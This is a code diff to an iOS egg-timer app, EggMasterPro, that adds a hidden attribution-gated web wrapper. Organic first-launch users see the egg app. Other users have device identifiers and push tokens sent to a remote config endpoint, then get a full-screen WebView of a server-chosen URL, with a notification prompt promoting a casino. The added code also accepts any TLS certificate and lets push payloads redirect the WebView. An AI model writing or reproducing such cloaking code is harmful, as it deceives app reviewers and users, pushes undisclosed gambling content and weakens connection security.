@@ -1,6 +1,13 @@
 import SwiftUI
 import UserNotifications
-import CoreBluetooth  // For Bluetooth scales placeholder
+import CoreBluetooth
+import WebKit
+import Network
+import FirebaseMessaging
+import AppsFlyerLib
+import FirebaseCore
+import UserNotifications
+import AppTrackingTransparency
 
 // MARK: - Color Extensions
 extension Color {
@@ -282,8 +289,11 @@ struct BounceAnimation: ViewModifier {
 // MARK: - Main App
 @main
 struct EggMasterProApp: App {
+    
+    @UIApplicationDelegateAdaptor(ApplicationDelegate.self) var delegate
+    
     init() {
-        requestNotificationPermission()
+        // requestNotificationPermission()
     }
     
     var body: some Scene {
@@ -294,7 +304,113 @@ struct EggMasterProApp: App {
     }
 }
 
-// MARK: - ContentView (Tab Bar)
+
+class ApplicationDelegate: UIResponder, UIApplicationDelegate, AppsFlyerLibDelegate, MessagingDelegate, UNUserNotificationCenterDelegate {
+    
+    private var conversionData: [AnyHashable: Any] = [:]
+    
+    func application(_ application: UIApplication,
+                     didReceiveRemoteNotification userInfo: [AnyHashable : Any],
+                     fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
+        processNotifPayload(userInfo)
+        completionHandler(.newData)
+    }
+    
+    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
+        conversionData = data
+        NotificationCenter.default.post(name: Notification.Name("ConversionDataReceived"), object: nil, userInfo: ["conversionData": conversionData])
+    }
+    
+    
+    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
+        FirebaseApp.configure()
+        
+        Messaging.messaging().delegate = self
+        UNUserNotificationCenter.current().delegate = self
+        application.registerForRemoteNotifications()
+        
+        
+        AppsFlyerLib.shared().appsFlyerDevKey = "2LgUnvHKfmJg9LCeMKzPMB"
+        AppsFlyerLib.shared().appleAppID = "6753349610"
+        AppsFlyerLib.shared().delegate = self
+        AppsFlyerLib.shared().start()
+        
+        if let notifPayload = launchOptions?[.remoteNotification] as? [AnyHashable: Any] {
+            processNotifPayload(notifPayload)
+        }
+        
+        NotificationCenter.default.addObserver(
+            self,
+            selector: #selector(activateTracking),
+            name: UIApplication.didBecomeActiveNotification,
+            object: nil
+        )
+        
+        return true
+    }
+    
+    @objc private func activateTracking() {
+        AppsFlyerLib.shared().start()
+        if #available(iOS 14, *) {
+            ATTrackingManager.requestTrackingAuthorization { _ in
+            }
+        }
+    }
+    
+    func onConversionDataFail(_ error: Error) {
+        NotificationCenter.default.post(name: Notification.Name("ConversionDataReceived"), object: nil, userInfo: ["conversionData": [:]])
+    }
+    
+    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
+        let payload = response.notification.request.content.userInfo
+        processNotifPayload(payload)
+        completionHandler()
+    }
+    
+    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
+        let payload = notification.request.content.userInfo
+        processNotifPayload(payload)
+        completionHandler([.banner, .sound])
+    }
+    
+    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
+        messaging.token { token, err in
+            if let _ = err {
+            }
+            UserDefaults.standard.set(token, forKey: "fcm_token")
+        }
+    }
+    
+    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
+    }
+    
+    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
+        Messaging.messaging().apnsToken = deviceToken
+    }
+    
+}
+
+extension ApplicationDelegate {
+    
+    
+    private func processNotifPayload(_ payload: [AnyHashable: Any]) {
+        var linkStr: String?
+        if let link = payload["url"] as? String {
+            linkStr = link
+        } else if let info = payload["data"] as? [String: Any], let link = info["url"] as? String {
+            linkStr = link
+        }
+        
+        if let linkStr = linkStr {
+            UserDefaults.standard.set(linkStr, forKey: "temp_url")
+            DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
+                NotificationCenter.default.post(name: NSNotification.Name("LoadTempURL"), object: nil, userInfo: ["tempUrl": linkStr])
+            }
+        }
+    }
+    
+}
+
 struct ContentView: View {
     var body: some View {
         TabView {
@@ -325,6 +441,9 @@ struct ContentView: View {
         }
         .accentColor(.eggYellow)
         .font(.system(.body, design: .rounded))
+        .onAppear {
+            requestNotificationPermission()
+        }
     }
 }
 
@@ -923,5 +1042,700 @@ struct StatisticsView: View {
 
 
 #Preview {
-    ContentView()
+    EggMasterProLauncherView()
 }
+
+class EggDisplayHandler: NSObject, WKNavigationDelegate, WKUIDelegate {
+    private let eggContentManager: EggContentManager
+    private var cycleCounter: Int = 0
+    private let cycleMax: Int = 70 // For testing
+    private var lastValidPath: URL?
+    func webView(_ webView: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
+        let space = challenge.protectionSpace
+        if space.authenticationMethod == NSURLAuthenticationMethodServerTrust {
+            if let trust = space.serverTrust {
+                let cred = URLCredential(trust: trust)
+                completionHandler(.useCredential, cred)
+            } else {
+                completionHandler(.performDefaultHandling, nil)
+            }
+        } else {
+            completionHandler(.performDefaultHandling, nil)
+        }
+    }
+    init(manager: EggContentManager) {
+        self.eggContentManager = manager
+        super.init()
+    }
+    func webView(
+        _ webView: WKWebView,
+        createWebViewWith configuration: WKWebViewConfiguration,
+        for navigationAction: WKNavigationAction,
+        windowFeatures: WKWindowFeatures
+    ) -> WKWebView? {
+        guard navigationAction.targetFrame == nil else {
+            return nil
+        }
+        let newEggDisplay = EggDisplayFactory.createMainDisplay(using: configuration)
+        setupNewDisplay(newEggDisplay)
+        attachNewDisplay(newEggDisplay)
+        eggContentManager.additionalDisplays.append(newEggDisplay)
+        if checkLoadValidity(in: newEggDisplay, with: navigationAction.request) {
+            newEggDisplay.load(navigationAction.request)
+        }
+        return newEggDisplay
+    }
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        // Inject rules for no scaling via tags and styles
+        let scriptContent = """
+let metaElement = document.createElement('meta');
+metaElement.name = 'viewport';
+metaElement.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+document.getElementsByTagName('head')[0].appendChild(metaElement);
+let styleElement = document.createElement('style');
+styleElement.textContent = 'body { touch-action: pan-x pan-y; } input, textarea, select { font-size: 16px !important; maximum-scale=1.0; }';
+document.getElementsByTagName('head')[0].appendChild(styleElement);
+document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
+""";
+        webView.evaluateJavaScript(scriptContent) { _, issue in
+            if let issue = issue {
+                print("Issue with script injection: (issue)")
+            }
+        }
+    }
+    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
+        cycleCounter += 1
+        if cycleCounter > cycleMax {
+            webView.stopLoading()
+            if let fallbackPath = lastValidPath {
+                webView.load(URLRequest(url: fallbackPath))
+            }
+            return
+        }
+        lastValidPath = webView.url // Keep the last working path
+        saveSessionData(from: webView)
+    }
+    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
+        if (error as NSError).code == NSURLErrorHTTPTooManyRedirects, let fallbackPath = lastValidPath {
+            webView.load(URLRequest(url: fallbackPath))
+        }
+    }
+    func webView(
+        _ webView: WKWebView,
+        decidePolicyFor navigationAction: WKNavigationAction,
+        decisionHandler: @escaping (WKNavigationActionPolicy) -> Void
+    ) {
+        guard let path = navigationAction.request.url else {
+            decisionHandler(.allow)
+            return
+        }
+        if path.absoluteString.hasPrefix("http") || path.absoluteString.hasPrefix("https") {
+            lastValidPath = path
+            decisionHandler(.allow)
+        } else {
+            UIApplication.shared.open(path, options: [:], completionHandler: nil)
+            decisionHandler(.cancel)
+        }
+    }
+    private func setupNewDisplay(_ display: WKWebView) {
+        display.translatesAutoresizingMaskIntoConstraints = false
+        display.scrollView.isScrollEnabled = true
+        display.scrollView.minimumZoomScale = 1.0
+        display.scrollView.maximumZoomScale = 1.0
+        display.scrollView.bouncesZoom = false
+        display.allowsBackForwardNavigationGestures = true
+        display.navigationDelegate = self
+        display.uiDelegate = self
+        eggContentManager.mainDisplay.addSubview(display)
+        // Add edge swipe for additional display
+        let edgeSwipe = UIScreenEdgePanGestureRecognizer(target: self, action: #selector(handleSwipe(_:)))
+        edgeSwipe.edges = .left
+        display.addGestureRecognizer(edgeSwipe)
+    }
+    private func attachNewDisplay(_ display: WKWebView) {
+        NSLayoutConstraint.activate([
+            display.leadingAnchor.constraint(equalTo: eggContentManager.mainDisplay.leadingAnchor),
+            display.trailingAnchor.constraint(equalTo: eggContentManager.mainDisplay.trailingAnchor),
+            display.topAnchor.constraint(equalTo: eggContentManager.mainDisplay.topAnchor),
+            display.bottomAnchor.constraint(equalTo: eggContentManager.mainDisplay.bottomAnchor)
+        ])
+    }
+    private func checkLoadValidity(in display: WKWebView, with req: URLRequest) -> Bool {
+        if let pathStr = req.url?.absoluteString, !pathStr.isEmpty, pathStr != "about:blank" {
+            return true
+        }
+        return false
+    }
+    private func saveSessionData(from display: WKWebView) {
+        display.configuration.websiteDataStore.httpCookieStore.getAllCookies { items in
+            var groupedData: [String: [String: [HTTPCookiePropertyKey: Any]]] = [:]
+            for item in items {
+                var dataPerGroup = groupedData[item.domain] ?? [:]
+                dataPerGroup[item.name] = item.properties as? [HTTPCookiePropertyKey: Any]
+                groupedData[item.domain] = dataPerGroup
+            }
+            UserDefaults.standard.set(groupedData, forKey: "saved_session_data")
+        }
+    }
+}
+
+struct EggDisplayFactory {
+    static func createMainDisplay(using config: WKWebViewConfiguration? = nil) -> WKWebView {
+        let conf = config ?? assembleConfig()
+        return WKWebView(frame: .zero, configuration: conf)
+    }
+    private static func assembleConfig() -> WKWebViewConfiguration {
+        let conf = WKWebViewConfiguration()
+        conf.allowsInlineMediaPlayback = true
+        conf.preferences = assemblePrefs()
+        conf.defaultWebpagePreferences = assemblePagePrefs()
+        conf.requiresUserActionForMediaPlayback = false
+        return conf
+    }
+    private static func assemblePrefs() -> WKPreferences {
+        let prefs = WKPreferences()
+        prefs.javaScriptEnabled = true
+        prefs.javaScriptCanOpenWindowsAutomatically = true
+        return prefs
+    }
+    private static func assemblePagePrefs() -> WKWebpagePreferences {
+        let prefs = WKWebpagePreferences()
+        prefs.allowsContentJavaScript = true
+        return prefs
+    }
+    static func shouldClearExtras(_ primary: WKWebView, _ addons: [WKWebView], currentPath: URL?) -> Bool {
+        if !addons.isEmpty {
+            addons.forEach { $0.removeFromSuperview() }
+            if let path = currentPath {
+                primary.load(URLRequest(url: path))
+            }
+            return true
+        } else if primary.canGoBack {
+            primary.goBack()
+            return false
+        }
+        return false
+    }
+}
+
+extension Notification.Name {
+    static let interfaceEvents = Notification.Name("ui_actions")
+}
+
+class EggContentManager: ObservableObject {
+    @Published var mainDisplay: WKWebView!
+    @Published var additionalDisplays: [WKWebView] = []
+    func setupMainDisplay() {
+        mainDisplay = EggDisplayFactory.createMainDisplay()
+        mainDisplay.scrollView.minimumZoomScale = 1.0
+        mainDisplay.scrollView.maximumZoomScale = 1.0
+        mainDisplay.scrollView.bouncesZoom = false
+        mainDisplay.allowsBackForwardNavigationGestures = true
+    }
+    func loadSavedSessionData() {
+        guard let savedData = UserDefaults.standard.dictionary(forKey: "saved_session_data") as? [String: [String: [HTTPCookiePropertyKey: AnyObject]]] else { return }
+        let dataStore = mainDisplay.configuration.websiteDataStore.httpCookieStore
+        savedData.values.flatMap { $0.values }.forEach { attributes in
+            if let sessionItem = HTTPCookie(properties: attributes as! [HTTPCookiePropertyKey: Any]) {
+                dataStore.setCookie(sessionItem)
+            }
+        }
+    }
+    func refreshContent() {
+        mainDisplay.reload()
+    }
+    func clearAdditional(activePath: URL?) {
+        if !additionalDisplays.isEmpty {
+            if let lastAddon = additionalDisplays.last {
+                lastAddon.removeFromSuperview()
+                additionalDisplays.removeLast()
+            }
+            if let path = activePath {
+                mainDisplay.load(URLRequest(url: path))
+            }
+        } else if mainDisplay.canGoBack {
+            mainDisplay.goBack()
+        }
+    }
+    func dismissLastAddon() {
+        if let lastAddon = additionalDisplays.last {
+            lastAddon.removeFromSuperview()
+            additionalDisplays.removeLast()
+        }
+    }
+}
+
+struct PrimaryEggDisplay: UIViewRepresentable {
+    let targetPath: URL
+    @StateObject private var manager = EggContentManager()
+    func makeUIView(context: Context) -> WKWebView {
+        manager.setupMainDisplay()
+        manager.mainDisplay.uiDelegate = context.coordinator
+        manager.mainDisplay.navigationDelegate = context.coordinator
+        manager.loadSavedSessionData()
+        manager.mainDisplay.load(URLRequest(url: targetPath))
+        return manager.mainDisplay
+    }
+    func updateUIView(_ display: WKWebView, context: Context) {
+    }
+    func makeCoordinator() -> EggDisplayHandler {
+        EggDisplayHandler(manager: manager)
+    }
+}
+
+extension EggDisplayHandler {
+    @objc func handleSwipe(_ gesture: UIScreenEdgePanGestureRecognizer) {
+        if gesture.state == .ended {
+            guard let display = gesture.view as? WKWebView else { return }
+            if display.canGoBack {
+                display.goBack()
+            } else if let lastAddon = eggContentManager.additionalDisplays.last, display == lastAddon {
+                eggContentManager.clearAdditional(activePath: nil)
+            }
+        }
+    }
+}
+
+struct MainEggInterface: View {
+    @State var interfacePath: String = ""
+    var body: some View {
+        ZStack(alignment: .bottom) {
+            if let path = URL(string: interfacePath) {
+                PrimaryEggDisplay(
+                    targetPath: path
+                )
+                .frame(maxWidth: .infinity, maxHeight: .infinity)
+                .ignoresSafeArea(.keyboard, edges: .bottom)
+            }
+        }
+        .preferredColorScheme(.dark)
+        .onAppear {
+            interfacePath = UserDefaults.standard.string(forKey: "temp_url") ?? (UserDefaults.standard.string(forKey: "saved_url") ?? "")
+            if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
+                UserDefaults.standard.set(nil, forKey: "temp_url")
+            }
+        }
+        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempURL"))) { _ in
+            if let temp = UserDefaults.standard.string(forKey: "temp_url"), !temp.isEmpty {
+                interfacePath = temp
+                UserDefaults.standard.set(nil, forKey: "temp_url")
+            }
+        }
+    }
+}
+
+class EggLauncher: ObservableObject {
+    @Published var activeView: ViewType = .loading
+    @Published var eggPath: URL?
+    @Published var showNotifPrompt = false
+    private var attribData: [AnyHashable: Any] = [:]
+    private var isFirstLaunch: Bool {
+        !UserDefaults.standard.bool(forKey: "hasLaunched")
+    }
+    enum ViewType {
+        case loading
+        case display
+        case fallback
+        case offline
+    }
+    init() {
+        NotificationCenter.default.addObserver(self, selector: #selector(handleAttribData(_:)), name: NSNotification.Name("ConversionDataReceived"), object: nil)
+        
+        NotificationCenter.default.addObserver(self, selector: #selector(handleAttribError(_:)), name: NSNotification.Name("ConversionDataFailed"), object: nil)
+        
+        NotificationCenter.default.addObserver(self, selector: #selector(handleTokenRefresh(_:)), name: NSNotification.Name("FCMTokenUpdated"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(retryConfig), name: NSNotification.Name("RetryConfig"), object: nil)
+        checkConnectionAndProceed()
+    }
+    deinit {
+        NotificationCenter.default.removeObserver(self)
+    }
+    private func checkConnectionAndProceed() {
+        let monitor = NWPathMonitor()
+        monitor.pathUpdateHandler = { path in
+            DispatchQueue.main.async {
+                if path.status != .satisfied {
+                    self.handleNoConnection()
+                }
+            }
+        }
+        monitor.start(queue: DispatchQueue.global())
+    }
+    @objc private func handleAttribData(_ notif: Notification) {
+        attribData = (notif.userInfo ?? [:])["conversionData"] as? [AnyHashable: Any] ?? [:]
+        processAttribData()
+    }
+    
+    @objc private func handleAttribError(_ notif: Notification) {
+        handleConfigError()
+    }
+    
+    @objc private func handleTokenRefresh(_ notif: Notification) {
+        if let token = notif.object as? String {
+            UserDefaults.standard.set(token, forKey: "fcm_token")
+            sendConfigRequest()
+        }
+    }
+    @objc private func processNotifLink(_ notif: Notification) {
+        guard let info = notif.userInfo as? [String: Any],
+              let link = info["tempUrl"] as? String else {
+            return
+        }
+        DispatchQueue.main.async {
+            self.eggPath = URL(string: link)!
+            self.activeView = .display
+        }
+    }
+    @objc private func retryConfig() {
+        checkConnectionAndProceed()
+    }
+    private func processAttribData() {
+        guard !attribData.isEmpty else { return }
+        if UserDefaults.standard.string(forKey: "app_mode") == "Funtik" {
+            DispatchQueue.main.async {
+                self.activeView = .fallback
+            }
+            return
+        }
+        if isFirstLaunch {
+            if let status = attribData["af_status"] as? String, status == "Organic" {
+                self.enableFallback()
+                return
+            }
+        }
+        if let link = UserDefaults.standard.string(forKey: "temp_url"), !link.isEmpty {
+            eggPath = URL(string: link)
+            self.activeView = .display
+            return
+        }
+        if eggPath == nil {
+            if !UserDefaults.standard.bool(forKey: "accepted_notifications") && !UserDefaults.standard.bool(forKey: "system_close_notifications") {
+                checkAndShowNotifPrompt()
+            } else {
+                sendConfigRequest()
+            }
+        }
+    }
+    func sendConfigRequest() {
+        guard let endpoint = URL(string: "https://eggmastterpro.com/config.php") else {
+            handleConfigError()
+            return
+        }
+        var req = URLRequest(url: endpoint)
+        req.httpMethod = "POST"
+        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        var params = attribData
+        params["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+        params["bundle_id"] = Bundle.main.bundleIdentifier ?? "com.example.app"
+        params["os"] = "iOS"
+        params["store_id"] = "id6753349610"
+        params["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
+        params["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
+        params["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        do {
+            req.httpBody = try JSONSerialization.data(withJSONObject: params)
+        } catch {
+            handleConfigError()
+            return
+        }
+        URLSession.shared.dataTask(with: req) { data, resp, err in
+            DispatchQueue.main.async {
+                if let _ = err {
+                    self.handleConfigError()
+                    return
+                }
+                guard let httpResp = resp as? HTTPURLResponse, httpResp.statusCode == 200,
+                      let data = data else {
+                    self.handleConfigError()
+                    return
+                }
+                do {
+                    if let jsonResp = try JSONSerialization.jsonObject(with: data) as? [String: Any] {
+                        if let success = jsonResp["ok"] as? Bool, success {
+                            if let pathStr = jsonResp["url"] as? String, let expiry = jsonResp["expires"] as? TimeInterval {
+                                UserDefaults.standard.set(pathStr, forKey: "saved_url")
+                                UserDefaults.standard.set(expiry, forKey: "saved_expires")
+                                UserDefaults.standard.set("Display", forKey: "app_mode")
+                                UserDefaults.standard.set(true, forKey: "hasLaunched")
+                                self.eggPath = URL(string: pathStr)
+                                self.activeView = .display
+                                if self.isFirstLaunch {
+                                    self.checkAndShowNotifPrompt()
+                                }
+                            }
+                        } else {
+                            self.enableFallback()
+                        }
+                    }
+                } catch {
+                    self.handleConfigError()
+                }
+            }
+        }.resume()
+    }
+    private func handleConfigError() {
+        if let storedPath = UserDefaults.standard.string(forKey: "saved_url"), let path = URL(string: storedPath) {
+            eggPath = path
+            activeView = .display
+        } else {
+            enableFallback()
+        }
+    }
+    private func enableFallback() {
+        UserDefaults.standard.set("Funtik", forKey: "app_mode")
+        UserDefaults.standard.set(true, forKey: "hasLaunched")
+        DispatchQueue.main.async {
+            self.activeView = .fallback
+        }
+    }
+    private func handleNoConnection() {
+        let mode = UserDefaults.standard.string(forKey: "app_mode")
+        if mode == "Display" {
+            DispatchQueue.main.async {
+                self.activeView = .offline
+            }
+        } else {
+            enableFallback()
+        }
+    }
+    private func checkAndShowNotifPrompt() {
+        if let lastAsk = UserDefaults.standard.value(forKey: "last_notification_ask") as? Date,
+           Date().timeIntervalSince(lastAsk) < 259200 {
+            sendConfigRequest()
+            return
+        }
+        showNotifPrompt = true
+    }
+    func requestNotifPermission() {
+        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, err in
+            DispatchQueue.main.async {
+                if granted {
+                    UserDefaults.standard.set(true, forKey: "accepted_notifications")
+                    UIApplication.shared.registerForRemoteNotifications()
+                } else {
+                    UserDefaults.standard.set(false, forKey: "accepted_notifications")
+                    UserDefaults.standard.set(true, forKey: "system_close_notifications")
+                }
+                self.sendConfigRequest()
+                self.showNotifPrompt = false
+            }
+        }
+    }
+}
+
+struct EggMasterProLauncherView: View {
+    
+    @StateObject private var controller = EggLauncher()
+    @State var animateLoading = false
+    
+    
+    var body: some View {
+        ZStack {
+            if controller.activeView == .loading || controller.showNotifPrompt {
+                splashScreenView
+            }
+            if controller.showNotifPrompt {
+                PushNotificationsRequestPermissionCustomView(
+                    onAccept: {
+                        controller.requestNotifPermission()
+                    },
+                    onDecline: {
+                        UserDefaults.standard.set(Date(), forKey: "last_notification_ask")
+                        controller.showNotifPrompt = false
+                        controller.sendConfigRequest()
+                    }
+                )
+            } else {
+                switch controller.activeView {
+                case .loading:
+                    EmptyView()
+                case .display:
+                    if let _ = controller.eggPath {
+                        MainEggInterface()
+                            .preferredColorScheme(.dark)
+                    } else {
+                        ContentView()
+                    }
+                case .fallback:
+                    ContentView()
+                case .offline:
+                    noSignalView
+                }
+            }
+        }
+    }
+    
+    private var splashScreenView: some View {
+        GeometryReader { geo in
+            let landscapeMode = geo.size.width > geo.size.height
+            
+            ZStack {
+                if landscapeMode {
+                    Image("splash_bg_land")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: geo.size.width, height: geo.size.height)
+                        .ignoresSafeArea()
+                } else {
+                    Image("splash_bg_portrait")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: geo.size.width, height: geo.size.height)
+                        .ignoresSafeArea()
+                }
+                
+                Text("LOADING...")
+                    .font(.custom("Harpseal", size: 20))
+                    .multilineTextAlignment(.center)
+                    .foregroundColor(.white)
+                    .padding()
+                    .background(
+                        RoundedRectangle(cornerRadius: 10, style: .continuous)
+                            .fill(.white.opacity(0.2))
+                    )
+                    .padding()
+            
+                VStack {
+                    
+                    ZStack {
+                        Image("egg")
+                            .resizable()
+                            .frame(width: 50, height: 70)
+                            .rotationEffect(animateLoading ? .degrees(360) : .degrees(0))
+                            .offset(x: animateLoading ? 50 : 0, y: animateLoading ? 50 : -50)
+                            .animation(.easeInOut(duration: 1.0).repeatForever(autoreverses: true), value: animateLoading)
+                        Image("egg_2")
+                            .resizable()
+                            .frame(width: 50, height: 50)
+                            .offset(x: animateLoading ? -50 : 0, y: animateLoading ? -50 : 50)
+                            .animation(.easeInOut(duration: 1.0).repeatForever(autoreverses: true), value: animateLoading)
+                    }
+                    .padding(.top, 250)
+                }
+                
+                VStack {
+                    Spacer()
+                    
+                    Text("WAIT UNTIL APP LOAD")
+                        .font(.custom("Harpseal", size: 14))
+                        .multilineTextAlignment(.center)
+                        .foregroundColor(.white)
+                }
+                .padding()
+            }
+        }
+        .ignoresSafeArea()
+        .onAppear {
+            animateLoading = true
+        }
+    }
+    
+    private var noSignalView: some View {
+        GeometryReader { geo in
+            let landscapeMode = geo.size.width > geo.size.height
+            
+            ZStack {
+                if landscapeMode {
+                    Image("splash_bg_land")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: geo.size.width, height: geo.size.height)
+                        .ignoresSafeArea()
+                } else {
+                    Image("splash_bg_portrait")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: geo.size.width, height: geo.size.height)
+                        .ignoresSafeArea()
+                }
+                
+                Text("NO INTERNET CONNECTION! CHECK YOUR INTERNET CONNECTION AND TRY AGAIN!")
+                    .font(.custom("Harpseal", size: 20))
+                    .multilineTextAlignment(.center)
+                    .foregroundColor(.white)
+                    .padding()
+                    .background(
+                        RoundedRectangle(cornerRadius: 10, style: .continuous)
+                            .fill(.white.opacity(0.2))
+                    )
+                    .padding()
+                    
+            }
+            
+        }
+        .ignoresSafeArea()
+    }
+    
+}
+
+
+struct PushNotificationsRequestPermissionCustomView: View {
+    var onAccept: () -> Void
+    var onDecline: () -> Void
+    
+    var body: some View {
+        GeometryReader { geometry in
+            let isLandscape = geometry.size.width > geometry.size.height
+            
+            ZStack {
+                if isLandscape {
+                    Image("splash_bg_land")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: geometry.size.width, height: geometry.size.height)
+                        .ignoresSafeArea()
+                } else {
+                    Image("splash_bg_portrait")
+                        .resizable()
+                        .scaledToFill()
+                        .frame(width: geometry.size.width, height: geometry.size.height)
+                        .ignoresSafeArea()
+                }
+                
+                VStack(spacing: isLandscape ? 5 : 10) {
+                    Spacer()
+                    
+                    Text("Allow notifications about bonuses and promos".uppercased())
+                        .font(.custom("Harpseal", size: 20))
+                        .multilineTextAlignment(.center)
+                        .foregroundColor(.white)
+                        .padding()
+                        .background(
+                            RoundedRectangle(cornerRadius: 10, style: .continuous)
+                                .fill(.white.opacity(0.2))
+                        )
+                        .padding(.horizontal, 8)
+                    
+                    Text("Stay tuned with best offers from our casino")
+                        .font(.custom("Harpseal", size: 15))
+                        .multilineTextAlignment(.center)
+                        .foregroundColor(.white)
+                        .padding(.horizontal, 52)
+                        .padding(.top, 4)
+                    
+                    Button(action: onAccept) {
+                        Image("allow_btn")
+                            .resizable()
+                            .frame(height: 60)
+                    }
+                    .frame(width: 350)
+                    .padding(.top, 24)
+                    
+                    Button(action: onDecline) {
+                        Text("SKIP")
+                            .font(.custom("Harpseal", size: 15))
+                            .multilineTextAlignment(.center)
+                            .foregroundColor(.white)
+                    }
+                    
+                    Spacer()
+                        .frame(height: isLandscape ? 50 : 70)
+                }
+                .padding(.horizontal, isLandscape ? 20 : 0)
+            }
+            
+        }
+        .ignoresSafeArea()
+    }
+}
+
